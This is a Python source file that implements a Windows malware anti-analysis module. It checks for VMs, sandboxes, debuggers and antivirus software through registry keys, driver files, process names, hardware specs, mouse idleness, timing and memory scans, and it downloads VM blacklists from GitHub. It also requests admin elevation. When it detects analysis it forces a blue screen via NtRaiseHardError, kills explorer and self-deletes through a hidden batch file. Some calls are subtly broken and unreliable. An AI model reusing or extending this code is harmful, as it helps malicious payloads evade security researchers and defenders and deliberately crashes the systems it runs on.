import os
import sys
import time
import ctypes
import urllib.request
import socket
import uuid
import platform
import psutil
import winreg
import subprocess
import random
import string
from ctypes import wintypes, windll, byref, c_uint, c_int, sizeof, c_bool, Structure, POINTER, c_ulong, c_char_p, c_void_p

DEBUG = False
start_time = time.time()
VM_MAC_PREFIXES = ['00:0C:29', '08:00:27', '00:1C:42', '00:50:56', '0A:00:27', '00:16:3E', '00:03:FF', '00:1F:16', 'BE:EF:CA', '42:01:0A']
SANDBOX_PROCESSES = ['vmsrvc', 'vmusrvc', 'vboxtray', 'vmtoolsd', 'df5serv', 'vboxservice', 'vmware', 'trio', 'tqos', 'NetworkService', 'updata', 'sandboxie', 'anyrun', 'triage', 'cuckoo', 'sample', 'kvmsrvc', 'qemud', 'xen', 'xenservice']
DEBUGGER_PROCESSES = ['ollydbg', 'ida64', 'idaq', 'windbg', 'x32dbg', 'x64dbg', 'wireshark', 'dumpcap', 'procmon', 'regmon', 'filemon', 'processhacker', 'autoruns', 'tcpview', 'volatility', 'fiddler', 'apimonitor', 'immunity', 'pestudio', 'dnspy', 'cheatengine', 'ghidra']
ANALYSIS_HOSTNAMES = ['sandbox', 'analysis', 'malware', 'vm', 'test', 'lab', 'cuckoo', 'virus', 'research']
ANALYSIS_USERNAMES = ['sandbox', 'malware', 'virus', 'sample', 'analyze', 'test', 'user', 'admin', 'administrator']
REGISTRY_KEYS_VM = [
    r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
    r"HARDWARE\Description\System",
    r"SOFTWARE\Oracle\VirtualBox Guest Additions",
    r"SYSTEM\ControlSet001\Services\VBoxGuest",
    r"SYSTEM\ControlSet001\Services\VBoxMouse",
    r"SYSTEM\ControlSet001\Services\VBoxService",
    r"SYSTEM\ControlSet001\Services\VBoxSF",
    r"SYSTEM\ControlSet001\Services\VBoxVideo",
    r"SOFTWARE\VMware, Inc.\VMware Tools"
]

class SYSTEM_INFO(Structure):
    _fields_ = [
        ("wProcessorArchitecture", c_uint),
        ("wReserved", c_uint),
        ("dwPageSize", c_ulong),
        ("lpMinimumApplicationAddress", c_void_p),
        ("lpMaximumApplicationAddress", c_void_p),
        ("dwActiveProcessorMask", c_ulong),
        ("dwNumberOfProcessors", c_ulong),
        ("dwProcessorType", c_ulong),
        ("dwAllocationGranularity", c_ulong),
        ("wProcessorLevel", c_uint),
        ("wProcessorRevision", c_uint),
    ]

class MEMORY_BASIC_INFORMATION(Structure):
    _fields_ = [
        ("BaseAddress", c_void_p),
        ("AllocationBase", c_void_p),
        ("AllocationProtect", c_ulong),
        ("RegionSize", c_size_t := c_ulong),
        ("State", c_ulong),
        ("Protect", c_ulong),
        ("Type", c_ulong)
    ]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def self_delete():
    try:
        if platform.system() == 'Windows':
            bat_file = os.path.join(os.environ['TEMP'], f"{random.randint(1000, 9999)}.bat")
            with open(bat_file, 'w') as f:
                f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q "{os.path.abspath(sys.argv[0])}"\ndel /f /q "{bat_file}"')
            subprocess.Popen(bat_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(sys.argv[0])
    except:
        pass
    sys.exit(0)

def blue_screen():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, byref(wintypes.DWORD()))
        except:
            os.system("taskkill /f /im explorer.exe")
            self_delete()
    else:
        print("\033[44m" + " " * 1000 + "\nSIMULATED BLUE SCREEN\nANTI-ANALYSIS TRIGGERED" + " " * 1000 + "\033[0m")
    self_delete()

def timing_attack():
    iterations = 10000000
    start = time.time()
    for i in range(iterations):
        pass
    end = time.time()
    return (end - start) < (iterations / 2000000)

def check_registry_vm():
    if platform.system() != 'Windows':
        return False
    
    for reg_key in REGISTRY_KEYS_VM:
        try:
            parts = reg_key.split('\\', 1)
            if len(parts) != 2:
                continue
                
            hkey = getattr(winreg, f'HKEY_{parts[0]}', None)
            if not hkey:
                continue
                
            try:
                key = winreg.OpenKey(hkey, parts[1], 0, winreg.KEY_READ)
                winreg.CloseKey(key)
                return True
            except:
                pass
                
            try:
                values = ["VMware", "VBOX", "Virtual", "Xen", "vmbus", "VM", "qemu"]
                key = winreg.OpenKey(hkey, parts[1], 0, winreg.KEY_READ)
                for i in range(100):
                    try:
                        name, data, _ = winreg.EnumValue(key, i)
                        if isinstance(data, str) and any(vm_str.lower() in data.lower() for vm_str in values):
                            winreg.CloseKey(key)
                            return True
                    except:
                        break
                winreg.CloseKey(key)
            except:
                pass
        except:
            pass
    
    return False

def check_vm():
    # MAC detection
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]).upper()
    if any(mac.startswith(prefix) for prefix in VM_MAC_PREFIXES):
        return True
    
    # WMI detection
    try:
        import wmi
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            if any(vm_str.lower() in item.Model.lower() for vm_str in ["virtual", "vmware", "vbox", "xen"]):
                return True
            if any(vm_str.lower() in item.Manufacturer.lower() for vm_str in ["vmware", "microsoft", "xen", "innotek", "qemu"]):
                return True
    except:
        pass
    
    # CPUID detection
    try:
        if platform.system() == 'Windows':
            import_vm_check = True
            try:
                from cpuid import cpu_vendor, cpu_brand
                if any(v in cpu_vendor().lower() for v in ["kvm", "microsoft hv", "vmware", "virtualbox"]):
                    return True
            except:
                import_vm_check = False
            
            if not import_vm_check:
                signature = subprocess.check_output("wmic cpu get ProcessorId", shell=True).decode()
                if "0F3F" in signature.upper():  # Common signature pattern in VMs
                    return True
    except:
        pass
    
    # Hardware specs detection
    if psutil.cpu_count() <= 1:
        return True
    if psutil.virtual_memory().total < 2 * 1024**3:  # Less than 2GB RAM
        return True
    if psutil.disk_usage('/').total < 60 * 1024**3:  # Less than 60GB disk
        return True
    
    # Check VM specific files
    vm_files = [
        r"C:\windows\System32\Drivers\VBoxMouse.sys",
        r"C:\windows\System32\Drivers\VBoxGuest.sys",
        r"C:\windows\System32\Drivers\VBoxSF.sys",
        r"C:\windows\System32\Drivers\VBoxVideo.sys",
        r"C:\windows\System32\vboxdisp.dll",
        r"C:\windows\System32\vboxhook.dll",
        r"C:\windows\System32\vboxmrxnp.dll",
        r"C:\windows\System32\vboxservice.exe",
        r"C:\windows\System32\vboxtray.exe",
        r"C:\windows\System32\Drivers\vmhgfs.sys",
        r"C:\windows\System32\Drivers\vm3dmp.sys",
        r"C:\windows\System32\Drivers\vmci.sys",
        r"C:\windows\System32\Drivers\vmhgfs.sys",
        r"C:\windows\System32\Drivers\vmmouse.sys",
        r"C:\windows\System32\Drivers\vmscsi.sys",
        r"C:\windows\System32\Drivers\vmx_svga.sys",
        r"C:\windows\System32\Drivers\vmxnet.sys",
    ]
    
    for file in vm_files:
        if os.path.exists(file):
            return True
    
    # Registry check
    if check_registry_vm():
        return True
    
    # DMI check
    try:
        if platform.system() == 'Windows':
            output = subprocess.check_output("wmic csproduct get name", shell=True).decode()
            if any(vm_str.lower() in output.lower() for vm_str in ["vmware", "virtualbox", "kvm", "xen", "virtual"]):
                return True
            output = subprocess.check_output("wmic bios get version", shell=True).decode()
            if any(vm_str.lower() in output.lower() for vm_str in ["vmware", "virtualbox", "kvm", "xen", "virtual"]):
                return True
    except:
        pass
    
    # Hostname check
    if any(vm_name.lower() in socket.gethostname().lower() for vm_name in ANALYSIS_HOSTNAMES):
        return True
    
    # Username check
    if any(user.lower() in os.getenv('USERNAME', '').lower() for user in ANALYSIS_USERNAMES):
        return True
        
    return False

def check_debugger():
    # Native API check
    if windll.kernel32.IsDebuggerPresent() != 0:
        return True
    
    # Remote debugger check
    check_remote = c_int(0)
    if windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), byref(check_remote)) != 0:
        if check_remote.value != 0:
            return True
    
    # Process list check
    processes = [p.name().lower() for p in psutil.process_iter()]
    if any(proc in " ".join(processes) for proc in DEBUGGER_PROCESSES):
        return True
    
    # NtGlobalFlag check
    try:
        peb = ctypes.windll.ntdll.NtCurrentPeb()
        if peb and peb.NtGlobalFlag & 0x70:  # Check for FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS
            return True
    except:
        pass
    
    # Hardware breakpoint check
    try:
        debug_registers = [0] * 4
        context = wintypes.CONTEXT()
        context.ContextFlags = 0x00010000  # CONTEXT_DEBUG_REGISTERS
        if windll.kernel32.GetThreadContext(windll.kernel32.GetCurrentThread(), byref(context)) != 0:
            debug_registers[0] = context.Dr0
            debug_registers[1] = context.Dr1
            debug_registers[2] = context.Dr2
            debug_registers[3] = context.Dr3
            if any(reg != 0 for reg in debug_registers):
                return True
    except:
        pass
    
    # Timing check for debuggers
    if timing_attack():
        return True
    
    # INT3 exception check
    try:
        original_bytecode = bytearray([0x90])  # NOP instruction
        address = id(original_bytecode) + 24  # Get memory address of bytecode
        
        # Write INT3 (0xCC) to the memory
        new_bytecode = bytearray([0xCC])  # INT3 instruction
        windll.kernel32.WriteProcessMemory(windll.kernel32.GetCurrentProcess(), address, new_bytecode, len(new_bytecode), 0)
        
        # Execute the memory to see if we trigger a breakpoint
        try:
            ctypes.CFUNCTYPE(None)(address)()
        except:
            windll.kernel32.WriteProcessMemory(windll.kernel32.GetCurrentProcess(), address, original_bytecode, len(original_bytecode), 0)
            # If we get here without a debugger catching the INT3, we're not being debugged
            return False
        
        # If we reached here, INT3 did not cause an exception - debugger present
        windll.kernel32.WriteProcessMemory(windll.kernel32.GetCurrentProcess(), address, original_bytecode, len(original_bytecode), 0)
        return True
    except:
        pass
    
    return False

def check_sandbox():
    # Process check
    processes = [p.name().lower() for p in psutil.process_iter()]
    if any(proc in " ".join(processes) for proc in SANDBOX_PROCESSES):
        return True
    
    # Screen size check
    user32 = windll.user32
    if user32.GetSystemMetrics(0) < 1024 or user32.GetSystemMetrics(1) < 768:
        return True
    
    # Mouse movement check
    try:
        cursor_pos = wintypes.POINT()
        windll.user32.GetCursorPos(byref(cursor_pos))
        initial_x, initial_y = cursor_pos.x, cursor_pos.y
        
        # Wait a short time and check if mouse moved
        time.sleep(0.5)
        windll.user32.GetCursorPos(byref(cursor_pos))
        if initial_x == cursor_pos.x and initial_y == cursor_pos.y:
            # Try one more time
            time.sleep(2)
            windll.user32.GetCursorPos(byref(cursor_pos))
            if initial_x == cursor_pos.x and initial_y == cursor_pos.y:
                return True
    except:
        pass
    
    # DLL analysis check
    try:
        loaded_dlls = [dll.lower() for dll in os.popen('tasklist /m').read().lower()]
        analysis_dlls = ['api_log', 'dir_watch', 'pstorec', 'sbiedll', 'dbghelp', 'syser', 'syserdbgout']
        if any(dll in " ".join(loaded_dlls) for dll in analysis_dlls):
            return True
    except:
        pass
    
    # Check for unusual registry modifications
    if platform.system() == 'Windows':
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
            value = winreg.QueryValueEx(key, '0')[0]
            winreg.CloseKey(key)
            if 'qemu' in value.lower() or 'vmware' in value.lower() or 'vbox' in value.lower():
                return True
        except:
            pass
    
    # Time check (sandboxes often run for short periods)
    if time.time() - start_time < 120:  # Less than 2 minutes
        return True
    
    # Check for minimal user activity
    try:
        idle_time = ctypes.c_uint()
        windll.user32.GetLastInputInfo(byref(idle_time))
        if idle_time.value < 1000:  # Minimal user interaction
            return True
    except:
        pass
    
    # Check for sleep patching (many sandboxes patch sleep functions)
    start_sleep = time.time()
    time.sleep(10)  # Request 10 seconds sleep
    if time.time() - start_sleep < 9:  # If sleep took less than 9 seconds, it's patched
        return True
    
    # Network interface count check
    if len(psutil.net_if_addrs()) < 2:  # Most real systems have multiple interfaces
        return True
    
    return False

def check_antivirus():
    av_processes = [
        'AvastSvc', 'avguard', 'avgnt', 'avast', 'bdagent', 'bdwtxag', 'ccsvchst', 
        'ekrn', 'fcsservice', 'mcshield', 'msascuil', 'msmpeng', 'msseces', 
        'nortonsecurity', 'savservice', 'zoolz', 'mbamservice', 'masvc', 
        'fsavgui', 'ashdisp', 'vsserv', 'rtvscan', 'tmlisten', 'afwserv', 
        'avp', 'navapsvc', 'nlclient', 'outlook', 'tmbmsrv'
    ]
    processes = [p.name().lower() for p in psutil.process_iter()]
    return any(av in " ".join(processes) for av in av_processes)

def check_memory_artifacts():
    try:
        system_info = SYSTEM_INFO()
        windll.kernel32.GetSystemInfo(byref(system_info))
        
        mbi = MEMORY_BASIC_INFORMATION()
        memory_addresses = []
        
        address = 0
        analysis_signatures = [b"sandbox", b"virtual", b"vmware", b"vbox", b"qemu", b"analysis", b"sample"]
        
        while address < system_info.lpMaximumApplicationAddress:
            if windll.kernel32.VirtualQuery(address, byref(mbi), sizeof(mbi)) != 0:
                if mbi.State == 0x1000 and mbi.Type == 0x20000:  # MEM_COMMIT and MEM_PRIVATE
                    memory_addresses.append((address, mbi.RegionSize))
                address = mbi.BaseAddress + mbi.RegionSize
            else:
                address += 4096
        
        for base_address, region_size in memory_addresses:
            try:
                buf = (c_char * region_size)()
                bytes_read = c_ulong(0)
                if windll.kernel32.ReadProcessMemory(windll.kernel32.GetCurrentProcess(), base_address, buf, region_size, byref(bytes_read)):
                    data = buf.raw[:bytes_read.value]
                    for sig in analysis_signatures:
                        if sig in data:
                            return True
            except:
                pass
    except:
        pass
    
    return False

def check_network_artifacts():
    try:
        # First check internet connectivity
        try:
            socket.create_connection(("www.google.com", 80), timeout=5)
        except:
            return True  # No internet connection is suspicious
        
        # Check DNS resolution capabilities
        try:
            socket.gethostbyname('www.microsoft.com')
        except:
            return True 
        
        try:
            proxy_values = ['localhost', '127.0.0.1', '0.0.0.0']
            for env_var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
                if os.environ.get(env_var) and any(proxy in os.environ.get(env_var) for proxy in proxy_values):
                    return True
        except:
            pass
        
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            suspicious_ips = ['10.0.2.', '192.168.56.', '192.168.0.', '10.0.0.']
            if any(ip.startswith(suspicious) for suspicious in suspicious_ips):
                if platform.system() == 'Windows':
                    output = subprocess.check_output('ipconfig', shell=True).decode()
                    if 'Default Gateway' in output and '10.0.2.1' in output:
                        return True
        except:
            pass
    except:
        pass
    
    return False

def check_blacklists():
    try:
        mac_list = urllib.request.urlopen('https://github.com/Lawxsz/vm-blacklist/raw/main/mac.txt').read().decode().splitlines()
        ip_list = urllib.request.urlopen('https://github.com/Lawxsz/vm-blacklist/raw/main/ips.txt').read().decode().splitlines()
        hwid_list = urllib.request.urlopen('https://github.com/Lawxsz/vm-blacklist/raw/main/hwid.txt').read().decode().splitlines()

        current_mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]).upper()
        if current_mac in mac_list:
            return True

        current_ip = urllib.request.urlopen('https://api.ipify.org').read().decode()
        if current_ip in ip_list:
            return True

        if platform.system() == 'Windows':
            hwid = os.popen('wmic csproduct get uuid').read().strip().split('\n')[-1]
            return hwid in hwid_list
    except Exception as e:
        if DEBUG: print(f"Error checking blacklists: {e}")
    
    return False

def check_disk_artifacts():
    analysis_directories = [
        "C:\\analysis", 
        "C:\\sandbox", 
        "C:\\tools", 
        "C:\\malware", 
        "C:\\samples",
        "C:\\program files\\oracle\\virtualbox guest additions",
        "C:\\program files\\VMware"
    ]
    
    for directory in analysis_directories:
        if os.path.exists(directory):
            return True
    
    return False

def perform_random_delay():
    delay_time = random.uniform(0.5, 3)
    time.sleep(delay_time)

def obscured_execution():
    try:
        perform_random_delay()
        
        subprocess.check_output("systeminfo", shell=True)
        perform_random_delay()
        
        temp_file = os.path.join(os.environ.get('TEMP', os.getcwd()), f"{random.randint(1000, 9999)}.tmp")
        with open(temp_file, 'w') as f:
            f.write(''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 1000))))
        
        perform_random_delay()
        
        checks = [
            check_vm, 
            check_debugger, 
            check_sandbox, 
            check_blacklists, 
            check_antivirus, 
            check_disk_artifacts,
            check_memory_artifacts,
            check_network_artifacts
        ]
        
        random.shuffle(checks)
        
        for check_function in checks:
            if check_function():
                try:
                    os.remove(temp_file)
                except:
                    pass
                return True
            perform_random_delay()
            
        try:
            os.remove(temp_file)
        except:
            pass
            
        return False
    except:
        return False

def main():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        except:
            pass
    
    if obscured_execution():
        blue_screen()
    
    # Normal application logic would continue here
    # ...

if __name__ == "__main__":
    main()
